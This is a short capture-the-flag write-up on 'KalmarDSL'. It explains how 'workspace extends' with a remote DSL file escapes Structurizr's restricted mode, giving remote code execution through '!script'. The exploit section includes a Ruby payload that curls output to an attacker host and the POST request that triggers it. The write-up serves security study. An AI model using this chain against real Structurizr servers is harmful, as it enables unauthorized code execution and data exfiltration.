# KalmarDSL

Using the unauthenticated endpoint `/dsl` we can hit the _structurizr/java_ DSL parsing logic, but we can't use `!script` due to "restricted mode".

The dockerfile builds _structurizr/onpremises_ v3.1.0 (at commit c11ff7c3986529839ba4cf9c6fd9efa3b9045f1c), plus the file mentioned a bugfix for `!script`.

Looking at recent commits in _structurizr/java_ (which implements the `!script` logic and parses the custom DSL), we find "[Ensures restricted mode setting is propagated to spawned parsers](https://github.com/structurizr/java/commit/a734e984457478277358d7ce80f3f534cbb54a22)".

This commit fixes a vulnerability where a _restricted_ `StructurizrDslParser` -- while parsing `Workspace { ... }` -- can be tricked into creating a new _unrestricted_ `StructurizrDslParser` to parse any remotely hosted non-JSON workspaces.

This means using `workspace extends https://.../exploit.dsl` we can gain RCE using `!script` inside _exploit.dsl_.

## Exploit steps

Host this file at `https://attacker.tld/exploit.dsl`:

```
workspace {
	!script ruby {
		system("curl https://attacker.tld/callback?flag=`/would you be so kind to provide me with a flag | base64`")
	}
}
```

Then:

```
POST /dsl
dsl=workspace extends https://attacker.com/exploit.dsl
```
